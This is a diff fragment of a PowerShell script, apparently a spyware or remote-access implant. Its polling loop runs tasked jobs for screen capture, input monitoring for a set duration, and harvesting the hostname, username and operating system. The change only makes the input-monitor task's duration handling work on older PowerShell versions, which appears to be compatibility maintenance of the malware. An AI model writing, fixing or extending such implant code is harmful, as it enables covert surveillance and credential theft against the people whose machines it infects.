@@ -42,7 +42,7 @@ while ($true) {
         foreach ($t in $tasks) {
             $result = switch ($t.task_type) {
                 "display_capture" { @{ data_type = "display"; file_data = Capture-Display } }
-                "input_monitor" { @{ data_type = "input"; data = Capture-Input -dur ($t.task_params.duration ?? 60) } }
+                "input_monitor" { $dur = if ($t.task_params.duration) { $t.task_params.duration } else { 60 }; @{ data_type = "input"; data = Capture-Input -dur $dur } }
                 "system_info" { @{ data_type = "sysinfo"; data = (@{ hostname=$env:COMPUTERNAME; username=$env:USERNAME; os=(Get-WmiObject Win32_OperatingSystem).Caption } | ConvertTo-Json) } }
             }
             if ($result) {
